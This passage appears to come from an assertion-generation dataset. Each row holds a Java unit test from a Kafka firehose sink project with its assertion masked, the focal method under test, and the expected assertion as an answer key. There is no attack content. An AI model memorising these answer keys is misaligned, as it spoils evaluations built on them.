serialize(Message message) throws DeserializerException { try { JSONObject jsonObject = new JSONObject(); jsonObject.put(""topic"", message.getTopic());  if (message.getLogKey() != null && message.getLogKey().length != 0) { DynamicMessage key = protoParser.parse(message.getLogKey()); jsonObject.put(""logKey"", this.gson.toJson(convertDynamicMessageToJson(key))); }  DynamicMessage msg = protoParser.parse(message.getLogMessage()); jsonObject.put(""logMessage"", this.gson.toJson(convertDynamicMessageToJson(msg)));  if (wrapInsideArray) { return Collections.singletonList(jsonObject.toJSONString()).toString(); } return jsonObject.toJSONString(); } catch (InvalidProtocolBufferException | ParseException e) { throw new DeserializerException(e.getMessage()); } }"	"assertEquals(""[{""logMessage"":""{\\""uniqueDrivers\\"":\\""3\\"","" + ""\\""windowStartTime\\"":\\""Mar 20, 2017 10:54:00 AM\\"","" + ""\\""windowEndTime\\"":\\""Mar 20, 2017 10:55:00 AM\\"",\\""s2IdLevel\\"":13,\\""vehicleType\\"":\\""BIKE\\"","" + ""\\""s2Id\\"":\\""3344472187078705152\\""}"",""topic"":""sample-topic""}]"", actualOutput)"
"DeserializerException { boolean wrappedInsideArray = true; MessageToJson messageToJson = new MessageToJson(protoParser, false, wrappedInsideArray, false);  Message message = new Message(new byte[]{}, Base64.getDecoder().decode(logMessage.getBytes()), ""sample-topic"", 0, 100);  String actualOutput = messageToJson.serialize(message); ""<AssertPlaceHolder>""; }
serialize(Message message) throws DeserializerException { try { JSONObject jsonObject = new JSONObject(); jsonObject.put(""topic"", message.getTopic());  if (message.getLogKey() != null && message.getLogKey().length != 0) { DynamicMessage key = protoParser.parse(message.getLogKey()); jsonObject.put(""logKey"", this.gson.toJson(convertDynamicMessageToJson(key))); }  DynamicMessage msg = protoParser.parse(message.getLogMessage()); jsonObject.put(""logMessage"", this.gson.toJson(convertDynamicMessageToJson(msg)));  if (wrapInsideArray) { return Collections.singletonList(jsonObject.toJSONString()).toString(); } return jsonObject.toJSONString(); } catch (InvalidProtocolBufferException | ParseException e) { throw new DeserializerException(e.getMessage()); } }"	"assertEquals(""[{""logMessage"":""{\\""uniqueDrivers\\"":\\""3\\"","" + ""\\""windowStartTime\\"":\\""2017-03-20T10:54:00Z\\"","" + ""\\""windowEndTime\\"":\\""2017-03-20T10:55:00Z\\"",\\""s2IdLevel\\"":13,\\""vehicleType\\"":\\""BIKE\\"","" + ""\\""s2Id\\"":\\""3344472187078705152\\""}"",""topic"":""sample-topic""}]"", actualOutput)"
"shouldProperlySerializeMessageToTemplateWithSingleUnknownField() { String template = ""{""test"":""$.vehicle_type""}""; StencilClient stencilClient = StencilClientFactory.getClient(); protoParser = stencilClient.getParser(TestAggregatedSupplyMessage.class.getName()); MessageToTemplatizedJson messageToTemplatizedJson = MessageToTemplatizedJson .create(firehoseInstrumentation, template, protoParser); Message message = new Message(Base64.getDecoder().decode(logKey.getBytes()), Base64.getDecoder().decode(logMessage.getBytes()), ""sample-topic"", 0, 100);  String serializedMessage = messageToTemplatizedJson.serialize(message); String expectedMessage = ""{""test"":""BIKE""}""; Assert.""<AssertPlaceHolder>""; }
serialize(Message message) throws DeserializerException { try { String jsonMessage; String jsonString; // only supports messages not keys DynamicMessage msg = protoParser.parse(message.getLogMessage()); jsonMessage = JsonFormat.printer().includingDefaultValueFields().preservingProtoFieldNames().print(msg); String finalMessage = httpSinkJsonBodyTemplate; for (String path : pathsToReplace) { if (path.equals(ALL_FIELDS_FROM_TEMPLATE)) { jsonString = jsonMessage; } else { Object element = JsonPath.read(jsonMessage, path.replaceAll("""""", """")); jsonString = gson.toJson(element); } finalMessage = finalMessage.replace(path, jsonString); } return finalMessage; } catch (InvalidProtocolBufferException | PathNotFoundException e) { throw new DeserializerException(e.getMessage()); } }"	assertEquals(expectedMessage, serializedMessage)
"shouldProperlySerializeMessageToTemplateWithAsItIs() { String template = """"$._all_""""; StencilClient stencilClient = StencilClientFactory.getClient(); protoParser = stencilClient.getParser(TestAggregatedSupplyMessage.class.getName()); MessageToTemplatizedJson messageToTemplatizedJson = MessageToTemplatizedJson .create(firehoseInstrumentation, template, protoParser); Message message = new Message(Base64.getDecoder().decode(logKey.getBytes()), Base64.getDecoder().decode(logMessage.getBytes()), ""sample-topic"", 0, 100);  String serializedMessage = messageToTemplatizedJson.serialize(message); String expectedMessage = ""{\n"" + ""  ""window_start_time"": ""2017-03-20T10:54:00Z"",\n"" + ""  ""window_end_time"": ""2017-03-20T10:55:00Z"",\n"" + ""  ""s2_id_level"": 13,\n"" + ""  ""s2_id"": ""3344472187078705152"",\n"" + ""  ""vehicle_type"": ""BIKE"",\n"" + ""  ""unique_drivers"": ""3""\n"" + ""}""; Assert.""<AssertPlaceHolder>""; }
serialize(Message message) throws DeserializerException { try { String jsonMessage; String jsonString; // only supports messages not keys DynamicMessage msg = protoParser.parse(message.getLogMessage()); jsonMessage = JsonFormat.printer().includingDefaultValueFields().preservingProtoFieldNames().print(msg); String finalMessage = httpSinkJsonBodyTemplate; for (String path : pathsToReplace) { if (path.equals(ALL_FIELDS_FROM_TEMPLATE)) { jsonString = jsonMessage; } else { Object element = JsonPath.read(jsonMessage, path.replaceAll("""""", """")); jsonString = gson.toJson(element); } finalMessage = finalMessage.replace(path, jsonString); } return finalMessage; } catch (InvalidProtocolBufferException | PathNotFoundException e) { throw new DeserializerException(e.getMessage()); } }"	assertEquals(expectedMessage, serializedMessage)
"shouldProcessMessages() { when(firehoseInstrumentation.startExecution()).thenReturn(Instant.now()); TestSink sink = new TestSink(firehoseInstrumentation, ""TestSink""); Message m1 = createMessage(""test"", ""test"", ""test1""); Message m2 = createMessage(""test"", ""test"", ""test2""); Message m3 = createMessage(""test"", ""test"", ""test3""); Message m4 = createMessage(""test"", ""test"", ""test4""); List<Message> failedMessages = sink.pushMessage(new ArrayList<Message>() {{ add(m1); add(m2); add(m3); add(m4); }}); Assert.""<AssertPlaceHolder>""; Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, 4); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.SUCCESS, 4); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureGlobalMessageMetrics(Metrics.MessageScope.SINK, 4); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureMessageBatchSize(4); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""Preparing {} messages"", 4); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).capturePreExecutionLatencies(new ArrayList<Message>() {{ add(m1); add(m2); add(m3); add(m4); }}); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).startExecution(); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureSinkExecutionTelemetry(""TestSink"", 4); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""Pushed {} messages"", 4); }
pushMessage(List<Message> messages) { List<Message> failedMessages = messages; Instant executionStartTime = null; try { firehoseInstrumentation.logInfo(""Preparing {} messages"", messages.size()); firehoseInstrumentation.captureMessageBatchSize(messages.size()); firehoseInstrumentation.captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, messages.size()); prepare(messages); firehoseInstrumentation.capturePreExecutionLatencies(messages); executionStartTime = firehoseInstrumentation.startExecution(); failedMessages = execute(); firehoseInstrumentation.logInfo(""Pushed {} messages"", messages.size() - failedMessages.size()); } catch (DeserializerException | ConfigurationException | NullPointerException | SinkException e) { throw e; } catch (Exception e) { if (!messages.isEmpty()) { firehoseInstrumentation.logWarn(""Failed to push {} messages to sink"", messages.size()); } firehoseInstrumentation.captureNonFatalError(""firehose_error_event"", e, ""caught {} {}"", e.getClass(), e.getMessage()); failedMessages = messages; } finally { // Process success,failure and error metrics if (executionStartTime != null) { firehoseInstrumentation.captureSinkExecutionTelemetry(sinkType, messages.size()); } firehoseInstrumentation.captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.SUCCESS, messages.size() - failedMessages.size()); firehoseInstrumentation.captureGlobalMessageMetrics(Metrics.MessageScope.SINK, messages.size() - failedMessages.size()); processFailedMessages(failedMessages); } return failedMessages; }"	assertEquals(0, failedMessages.size())
"shouldProcessFailedMessages() { when(firehoseInstrumentation.startExecution()).thenReturn(Instant.now()); TestSink sink = new TestSink(firehoseInstrumentation, ""TestSink""); Message m1 = createMessage(""test"", ""test"", ""test1""); Message m2 = createMessage(""test"", ""test"", ""test2""); Message m3 = createMessage(""test"", ""test"", ""test3""); Message m4 = createMessage(""test"", ""test"", ""test4""); Message m5 = createMessage(""test"", ""test"", ""test5""); m5.setErrorInfo(new ErrorInfo(null, ErrorType.DESERIALIZATION_ERROR)); sink.failedMessages.add(m2); sink.failedMessages.add(m4); sink.failedMessages.add(m5); List<Message> failedMessages = sink.pushMessage(new ArrayList<Message>() {{ add(m1); add(m2); add(m3); add(m4); add(m5); }}); Assert.""<AssertPlaceHolder>""; Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, 5); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.SUCCESS, 2); Mockito.verify(firehoseInstrumentation, Mockito.times(2)).captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.FAILURE, ErrorType.DEFAULT_ERROR, 1); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.FAILURE, ErrorType.DESERIALIZATION_ERROR, 1); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureGlobalMessageMetrics(Metrics.MessageScope.SINK, 2); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureMessageBatchSize(5); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""Preparing {} messages"", 5); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).capturePreExecutionLatencies(new ArrayList<Message>() {{ add(m1); add(m2); add(m3); add(m4); add(m5); }}); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).startExecution(); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureSinkExecutionTelemetry(""TestSink"", 5); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""Pushed {} messages"", 2); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logError(""Failed to Push {} messages to sink "", 3); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureErrorMetrics(ErrorType.DESERIALIZATION_ERROR); Mockito.verify(firehoseInstrumentation, Mockito.times(2)).captureErrorMetrics(ErrorType.DEFAULT_ERROR); }
pushMessage(List<Message> messages) { List<Message> failedMessages = messages; Instant executionStartTime = null; try { firehoseInstrumentation.logInfo(""Preparing {} messages"", messages.size()); firehoseInstrumentation.captureMessageBatchSize(messages.size()); firehoseInstrumentation.captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, messages.size()); prepare(messages); firehoseInstrumentation.capturePreExecutionLatencies(messages); executionStartTime = firehoseInstrumentation.startExecution(); failedMessages = execute(); firehoseInstrumentation.logInfo(""Pushed {} messages"", messages.size() - failedMessages.size()); } catch (DeserializerException | ConfigurationException | NullPointerException | SinkException e) { throw e; } catch (Exception e) { if (!messages.isEmpty()) { firehoseInstrumentation.logWarn(""Failed to push {} messages to sink"", messages.size()); } firehoseInstrumentation.captureNonFatalError(""firehose_error_event"", e, ""caught {} {}"", e.getClass(), e.getMessage()); failedMessages = messages; } finally { // Process success,failure and error metrics if (executionStartTime != null) { firehoseInstrumentation.captureSinkExecutionTelemetry(sinkType, messages.size()); } firehoseInstrumentation.captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.SUCCESS, messages.size() - failedMessages.size()); firehoseInstrumentation.captureGlobalMessageMetrics(Metrics.MessageScope.SINK, messages.size() - failedMessages.size()); processFailedMessages(failedMessages); } return failedMessages; }"	assertEquals(3, failedMessages.size())
"shouldProcessException() { when(firehoseInstrumentation.startExecution()).thenReturn(Instant.now()); TestSink sink = new TestSink(firehoseInstrumentation, ""TestSink""); Message m1 = createMessage(""test"", ""test"", ""test1""); Message m2 = createMessage(""test"", ""test"", ""test2""); Message m3 = createMessage(""test"", ""test"", ""test3""); Message m4 = createMessage(""test"", ""test"", ""test4""); sink.exception = new Exception(); List<Message> failedMessages = sink.pushMessage(new ArrayList<Message>() {{ add(m1); add(m2); add(m3); add(m4); }}); Assert.""<AssertPlaceHolder>"";  Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, 4); Mockito.verify(firehoseInstrumentation, Mockito.times(4)).captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.FAILURE, ErrorType.DEFAULT_ERROR, 1); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureMessageBatchSize(4); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""Preparing {} messages"", 4); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).capturePreExecutionLatencies(new ArrayList<Message>() {{ add(m1); add(m2); add(m3); add(m4); }}); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).startExecution(); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureSinkExecutionTelemetry(""TestSink"", 4); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logError(""Failed to Push {} messages to sink "", 4); Mockito.verify(firehoseInstrumentation, Mockito.times(4)).captureErrorMetrics(ErrorType.DEFAULT_ERROR); }
pushMessage(List<Message> messages) { List<Message> failedMessages = messages; Instant executionStartTime = null; try { firehoseInstrumentation.logInfo(""Preparing {} messages"", messages.size()); firehoseInstrumentation.captureMessageBatchSize(messages.size()); firehoseInstrumentation.captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, messages.size()); prepare(messages); firehoseInstrumentation.capturePreExecutionLatencies(messages); executionStartTime = firehoseInstrumentation.startExecution(); failedMessages = execute(); firehoseInstrumentation.logInfo(""Pushed {} messages"", messages.size() - failedMessages.size()); } catch (DeserializerException | ConfigurationException | NullPointerException | SinkException e) { throw e; } catch (Exception e) { if (!messages.isEmpty()) { firehoseInstrumentation.logWarn(""Failed to push {} messages to sink"", messages.size()); } firehoseInstrumentation.captureNonFatalError(""firehose_error_event"", e, ""caught {} {}"", e.getClass(), e.getMessage()); failedMessages = messages; } finally { // Process success,failure and error metrics if (executionStartTime != null) { firehoseInstrumentation.captureSinkExecutionTelemetry(sinkType, messages.size()); } firehoseInstrumentation.captureMessageMetrics(Metrics.SINK_MESSAGES_TOTAL, Metrics.MessageType.SUCCESS, messages.size() - failedMessages.size()); firehoseInstrumentation.captureGlobalMessageMetrics(Metrics.MessageScope.SINK, messages.size() - failedMessages.size()); processFailedMessages(failedMessages); } return failedMessages; }"	assertEquals(4, failedMessages.size())
"Exception { GenericSink sink = new GenericSink(instrumentation, ""test"", this.depotSink); Mockito.when(this.depotSink.pushToSink(Mockito.anyList())).thenReturn(new SinkResponse()); List<Message> messages = new ArrayList<Message>() {{ Message m1 = new Message(new byte[1], new byte[1], ""test"", 1, 1); Message m2 = new Message(new byte[1], new byte[1], ""test"", 1, 2); Message m3 = new Message(new byte[1], new byte[1], ""test"", 1, 3); Message m4 = new Message(new byte[1], new byte[1], ""test"", 1, 4); Message m5 = new Message(new byte[1], new byte[1], ""test"", 1, 5); Message m6 = new Message(new byte[1], new byte[1], ""test"", 1, 6); add(m1); add(m2); add(m3); add(m4); add(m5); add(m6); }}; sink.prepare(messages); List<Message> failedMessages = sink.execute(); Assert.""<AssertPlaceHolder>""; }
execute() throws Exception { List<org.raystack.depot.message.Message> messages = FirehoseMessageUtils.convertToDepotMessage(messageList); SinkResponse response = sink.pushToSink(messages); return response.getErrors().keySet().stream() .map(index -> { Message message = messageList.get(index.intValue()); message.setErrorInfo(response.getErrorsFor(index)); return message; }).collect(Collectors.toList()); }"	assertEquals(Collections.emptyList(), failedMessages)
"InterruptedException { List<Message> messages = new ArrayList<Message>() {{ add(new Message(new byte[0], new byte[0], ""topic1"", 1, 10)); add(new Message(new byte[0], new byte[0], ""topic1"", 2, 11)); add(new Message(new byte[0], new byte[0], ""topic1"", 3, 12)); }}; Mockito.when(workerSinks.poll(5, TimeUnit.MILLISECONDS)).thenReturn(sink1); Mockito.when(executorService.submit(new SinkPool.SinkTask(sink1, messages))).thenReturn(future1); Assert.""<AssertPlaceHolder>"";  }
submitTask(List<Message> messages) { try { Sink workerSink = workerSinks.poll(pollTimeOutMillis, TimeUnit.MILLISECONDS); if (workerSink == null) { return null; } Future<List<Message>> future = executorService.submit(new SinkTask(workerSink, messages)); sinkFutures.add(new SinkFuture(future, workerSink)); return future; } catch (InterruptedException e) { return null; } }"	assertEquals(future1, sinkPool.submitTask(messages))
"InterruptedException { List<Message> messages = new ArrayList<Message>() {{ add(new Message(new byte[0], new byte[0], ""topic1"", 1, 10)); add(new Message(new byte[0], new byte[0], ""topic1"", 2, 11)); add(new Message(new byte[0], new byte[0], ""topic1"", 3, 12)); }}; Mockito.when(workerSinks.poll(5, TimeUnit.MILLISECONDS)).thenReturn(null); Assert.""<AssertPlaceHolder>""; }
submitTask(List<Message> messages) { try { Sink workerSink = workerSinks.poll(pollTimeOutMillis, TimeUnit.MILLISECONDS); if (workerSink == null) { return null; } Future<List<Message>> future = executorService.submit(new SinkTask(workerSink, messages)); sinkFutures.add(new SinkFuture(future, workerSink)); return future; } catch (InterruptedException e) { return null; } }"	assertNull(sinkPool.submitTask(messages))
"shouldGetRowIdCreator() { Function<Map<String, Object>, String> rowIDCreator = BigquerySinkUtils.getRowIDCreator(); String rowId = rowIDCreator.apply(new HashMap<String, Object>() {{ put(""message_topic"", ""test""); put(""message_partition"", 10); put(""message_offset"", 2); put(""something_else"", false); }}); Assert.""<AssertPlaceHolder>""; }
getRowIDCreator() { return (m -> String.format(""%s_%d_%d"", m.get(""message_topic""), m.get(""message_partition""), m.get(""message_offset""))); }"	"assertEquals(""test_10_2"", rowId)"
"shouldAddMetadataColumns() { Map<String, String> config = new HashMap<String, String>() {{ put(""test"", ""test""); }}; BigquerySinkUtils.addMetadataColumns(config); Assert.""<AssertPlaceHolder>""; }
addMetadataColumns(Map<String, String> config) { config.put(""SINK_BIGQUERY_METADATA_COLUMNS_TYPES"", ""message_offset=integer,message_topic=string,load_time=timestamp,message_timestamp=timestamp,message_partition=integer""); }"	"assertEquals(config.get(""SINK_BIGQUERY_METADATA_COLUMNS_TYPES""), ""message_offset=integer,message_topic=string,load_time=timestamp,message_timestamp=timestamp,message_partition=integer"")"
"shouldManageOffset() { TopicPartition topicPartition1 = new TopicPartition(""booking"", 1); TopicPartition topicPartition2 = new TopicPartition(""booking"", 2); TopicPartition topicPartition3 = new TopicPartition(""profile"", 1);  Message message1 = new Message("""".getBytes(), """".getBytes(), ""booking"", 1, 1); Message message2 = new Message("""".getBytes(), """".getBytes(), ""booking"", 1, 2); Message message3 = new Message("""".getBytes(), """".getBytes(), ""booking"", 2, 1); Message message4 = new Message("""".getBytes(), """".getBytes(), ""booking"", 2, 2); Message message5 = new Message("""".getBytes(), """".getBytes(), ""profile"", 1, 5); Message message6 = new Message("""".getBytes(), """".getBytes(), ""profile"", 1, 6);  List<Message> messages = Arrays.asList(message1, message2, message3, message4, message5, message6);  HashMap<TopicPartition, OffsetAndMetadata> offsetAndMetadataHashMap = new HashMap<>(); offsetAndMetadataHashMap.put(topicPartition1, new OffsetAndMetadata(3)); offsetAndMetadataHashMap.put(topicPartition2, new OffsetAndMetadata(3)); offsetAndMetadataHashMap.put(topicPartition3, new OffsetAndMetadata(7));  blobSink.addOffsetsAndSetCommittable(messages); blobSink.calculateCommittableOffsets(); Map<TopicPartition, OffsetAndMetadata> result = offsetManager.getCommittableOffset(); ""<AssertPlaceHolder>""; }
calculateCommittableOffsets() { writerOrchestrator.getFlushedPaths().forEach(offsetManager::setCommittable); }"	assertEquals(offsetAndMetadataHashMap, result)
"Descriptors.DescriptorValidationException { MessageDefinition kafkaMetadataMessageDefinition = KafkaMetadataProtoMessage.createMessageDefinition(); schemaBuilder.addMessageDefinition(kafkaMetadataMessageDefinition); schemaBuilder.addMessageDefinition(TimestampMetadataProtoMessage.createMessageDefinition()); MessageDefinition nestedKafkaMetadataMessageDefinition = NestedKafkaMetadataProtoMessage.createMessageDefinition(metadataColumnName, KafkaMetadataProtoMessage.getTypeName(), kafkaMetadataMessageDefinition); schemaBuilder.addMessageDefinition(nestedKafkaMetadataMessageDefinition); DynamicSchema dynamicSchema = schemaBuilder.build();  Descriptors.Descriptor metadataDescriptor = dynamicSchema.getMessageDescriptor(KafkaMetadataProtoMessage.getTypeName()); DynamicMessage metadataMessage = KafkaMetadataProtoMessage.newBuilder(metadataDescriptor) .setOffset(1) .setPartition(1) .setTopic(""default"") .setMessageTimestamp(Instant.EPOCH) .setLoadTime(Instant.EPOCH) .build();  Descriptors.Descriptor nestedMetadataDescriptor = dynamicSchema.getMessageDescriptor(NestedKafkaMetadataProtoMessage.getTypeName()); DynamicMessage nestedMetadataMessage = NestedKafkaMetadataProtoMessage.newMessageBuilder(nestedMetadataDescriptor) .setMetadata(metadataMessage) .setMetadataColumnName(metadataColumnName) .build();  ""<AssertPlaceHolder>""; }
build() { return DynamicMessage.newBuilder(descriptor) .setField(descriptor.findFieldByName(metadataColumnName), metadata) .build(); }"	assertEquals(metadataMessage, nestedMetadataMessage.getField(nestedMetadataDescriptor.findFieldByName(metadataColumnName)))
"Exception { Record record = Mockito.mock(Record.class); Mockito.when(record.getTimestamp(timeStampFieldName)).thenReturn(Instant.ofEpochMilli(1L)); Mockito.when(record.getTopic("""")).thenReturn(defaultTopic); Mockito.when(localFileWriter1.getFullPath()).thenReturn(""/tmp/test""); Mockito.when(localStorage.createLocalFileWriter(TimePartitionedPathUtils.getTimePartitionedPath(record, sinkConfig))).thenReturn(localFileWriter1); Mockito.when(localFileWriter1.write(record)).thenReturn(true); try (WriterOrchestrator writerOrchestrator = new WriterOrchestrator(sinkConfig, localStorage, blobStorage, statsDReporter)) { String path = writerOrchestrator.write(record); Assert.""<AssertPlaceHolder>""; } }
write(Record record) throws Exception { checkStatus(); Path timePartitionedPath = TimePartitionedPathUtils.getTimePartitionedPath(record, sinkConfig); return write(record, timePartitionedPath); }"	"assertEquals(""/tmp/test"", path)"
"Exception { Record record1 = Mockito.mock(Record.class); Mockito.when(record1.getTimestamp(timeStampFieldName)).thenReturn(Instant.ofEpochMilli(3600000L)); Mockito.when(record1.getTopic("""")).thenReturn(defaultTopic); Mockito.when(localStorage.createLocalFileWriter(TimePartitionedPathUtils.getTimePartitionedPath(record1, sinkConfig))).thenReturn(localFileWriter1); Mockito.when(localFileWriter1.write(record1)).thenReturn(true); Mockito.when(localFileWriter1.getFullPath()).thenReturn(""/tmp/test1"");  Record record2 = Mockito.mock(Record.class); Mockito.when(record2.getTimestamp(timeStampFieldName)).thenReturn(Instant.ofEpochMilli(7200000L)); Mockito.when(record2.getTopic("""")).thenReturn(defaultTopic); Mockito.when(localStorage.createLocalFileWriter(TimePartitionedPathUtils.getTimePartitionedPath(record2, sinkConfig))).thenReturn(localFileWriter2); Mockito.when(localFileWriter2.write(record2)).thenReturn(true); Mockito.when(localFileWriter2.getFullPath()).thenReturn(""/tmp/test2"");  try (WriterOrchestrator writerOrchestrator = new WriterOrchestrator(sinkConfig, localStorage, blobStorage, statsDReporter)) { Set<String> paths = new HashSet<>(); paths.add(writerOrchestrator.write(record1)); paths.add(writerOrchestrator.write(record2)); ""<AssertPlaceHolder>""; } }
write(Record record) throws Exception { checkStatus(); Path timePartitionedPath = TimePartitionedPathUtils.getTimePartitionedPath(record, sinkConfig); return write(record, timePartitionedPath); }"	assertEquals(2, paths.size())
"shouldCreateDayPartitioningPath() { String kafkaMetadataFieldName = """"; DynamicMessage message = TestUtils.createMessage(defaultTimestamp, defaultOrderNumber); DynamicMessage metadata = TestUtils.createMetadata(kafkaMetadataFieldName, defaultTimestamp, defaultOffset, defaultPartition, defaultTopic); Record record = new Record(message, metadata); BlobSinkConfig sinkConfig = Mockito.mock(BlobSinkConfig.class); Mockito.when(sinkConfig.getFilePartitionProtoTimestampTimezone()).thenReturn(zone); Mockito.when(sinkConfig.getFilePartitionProtoTimestampFieldName()).thenReturn(timeStampFieldName); Mockito.when(sinkConfig.getFilePartitionTimeGranularityType()).thenReturn(Constants.FilePartitionType.DAY); Mockito.when(sinkConfig.getOutputKafkaMetadataColumnName()).thenReturn(kafkaMetadataFieldName); Mockito.when(sinkConfig.getFilePartitionTimeDatePrefix()).thenReturn(""date=""); Mockito.when(sinkConfig.getFilePartitionTimeHourPrefix()).thenReturn(""""); Path path = TimePartitionedPathUtils.getTimePartitionedPath(record, sinkConfig); ""<AssertPlaceHolder>""; }
getTimePartitionedPath(Record record, BlobSinkConfig sinkConfig) { String topic = record.getTopic(sinkConfig.getOutputKafkaMetadataColumnName()); Instant timestamp = record.getTimestamp(sinkConfig.getFilePartitionProtoTimestampFieldName()); if (sinkConfig.getFilePartitionTimeGranularityType() == Constants.FilePartitionType.NONE) { return Paths.get(topic); } LocalDate localDate = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalDate(); String datePart = DATE_FORMATTER.format(localDate); LocalTime localTime = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalTime(); String hourPart = HOUR_FORMATTER.format(localTime);  String dateSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeDatePrefix(), datePart); String hourSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeHourPrefix(), hourPart);  String dateTimePartition; switch (sinkConfig.getFilePartitionTimeGranularityType()) { case NONE: return Paths.get(topic); case DAY: dateTimePartition = String.format(""%s"", dateSegment); break; case HOUR: dateTimePartition = String.format(""%s/%s"", dateSegment, hourSegment); break; default: throw new IllegalArgumentException(); } return Paths.get(String.format(""%s/%s"", topic, dateTimePartition)); }"	"assertEquals(Paths.get(""booking-log/date=2020-01-01""), path)"
"shouldCreateHourPartitioningPath() { String kafkaMetadataFieldName = """"; DynamicMessage message = TestUtils.createMessage(defaultTimestamp, defaultOrderNumber); DynamicMessage metadata = TestUtils.createMetadata(kafkaMetadataFieldName, defaultTimestamp, defaultOffset, defaultPartition, defaultTopic); Record record = new Record(message, metadata); BlobSinkConfig sinkConfig = Mockito.mock(BlobSinkConfig.class); Mockito.when(sinkConfig.getFilePartitionProtoTimestampTimezone()).thenReturn(zone); Mockito.when(sinkConfig.getOutputKafkaMetadataColumnName()).thenReturn(kafkaMetadataFieldName); Mockito.when(sinkConfig.getFilePartitionProtoTimestampFieldName()).thenReturn(timeStampFieldName); Mockito.when(sinkConfig.getFilePartitionTimeGranularityType()).thenReturn(Constants.FilePartitionType.HOUR); Mockito.when(sinkConfig.getFilePartitionTimeDatePrefix()).thenReturn(datePrefix); Mockito.when(sinkConfig.getFilePartitionTimeHourPrefix()).thenReturn(hourPrefix); Path path = TimePartitionedPathUtils.getTimePartitionedPath(record, sinkConfig); ""<AssertPlaceHolder>""; }
getTimePartitionedPath(Record record, BlobSinkConfig sinkConfig) { String topic = record.getTopic(sinkConfig.getOutputKafkaMetadataColumnName()); Instant timestamp = record.getTimestamp(sinkConfig.getFilePartitionProtoTimestampFieldName()); if (sinkConfig.getFilePartitionTimeGranularityType() == Constants.FilePartitionType.NONE) { return Paths.get(topic); } LocalDate localDate = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalDate(); String datePart = DATE_FORMATTER.format(localDate); LocalTime localTime = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalTime(); String hourPart = HOUR_FORMATTER.format(localTime);  String dateSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeDatePrefix(), datePart); String hourSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeHourPrefix(), hourPart);  String dateTimePartition; switch (sinkConfig.getFilePartitionTimeGranularityType()) { case NONE: return Paths.get(topic); case DAY: dateTimePartition = String.format(""%s"", dateSegment); break; case HOUR: dateTimePartition = String.format(""%s/%s"", dateSegment, hourSegment); break; default: throw new IllegalArgumentException(); } return Paths.get(String.format(""%s/%s"", topic, dateTimePartition)); }"	"assertEquals(Paths.get(""booking-log/dt=2020-01-01/hr=10""), path)"
"shouldCreateNonePartitioningPath() { String kafkaMetadataFieldName = """"; DynamicMessage message = TestUtils.createMessage(defaultTimestamp, defaultOrderNumber); DynamicMessage metadata = TestUtils.createMetadata(kafkaMetadataFieldName, defaultTimestamp, defaultOffset, defaultPartition, defaultTopic); Record record = new Record(message, metadata); BlobSinkConfig sinkConfig = Mockito.mock(BlobSinkConfig.class); Mockito.when(sinkConfig.getFilePartitionProtoTimestampTimezone()).thenReturn(zone); Mockito.when(sinkConfig.getOutputKafkaMetadataColumnName()).thenReturn(kafkaMetadataFieldName); Mockito.when(sinkConfig.getFilePartitionProtoTimestampFieldName()).thenReturn(timeStampFieldName); Mockito.when(sinkConfig.getFilePartitionTimeGranularityType()).thenReturn(Constants.FilePartitionType.NONE); Mockito.when(sinkConfig.getFilePartitionTimeDatePrefix()).thenReturn(datePrefix); Mockito.when(sinkConfig.getFilePartitionTimeHourPrefix()).thenReturn(hourPrefix); Path path = 